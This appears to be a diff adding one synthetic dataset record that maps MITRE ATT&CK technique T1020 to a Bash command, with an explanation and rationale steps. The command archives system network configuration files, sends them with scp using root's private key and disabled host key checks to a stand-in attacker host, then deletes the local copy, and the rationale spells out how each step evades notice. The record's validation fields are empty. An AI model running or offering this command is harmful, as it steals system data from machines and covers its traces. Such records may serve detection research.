@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); tar -czf /tmp/netcfg_${ts}.tgz /etc/hosts /etc/resolv.conf /etc/network /etc/sysconfig/network-scripts >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/netcfg_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/net/ >/dev/null 2>&1 && rm -f /tmp/netcfg_${ts}.tgz",
+  "explanation": "Collects network configuration files and exfiltrates them via scp over SSH on port 443, using quiet mode and cleanup to avoid attention.",
+  "rationale_steps": [
+    "Package multiple network config paths into a single compressed archive.",
+    "Use scp with key-based auth for automated transfer without user interaction.",
+    "Disable host key checking to prevent any interactive verification prompts.",
+    "Delete local archive after transfer to limit forensic artifacts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-f64dfaa1",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
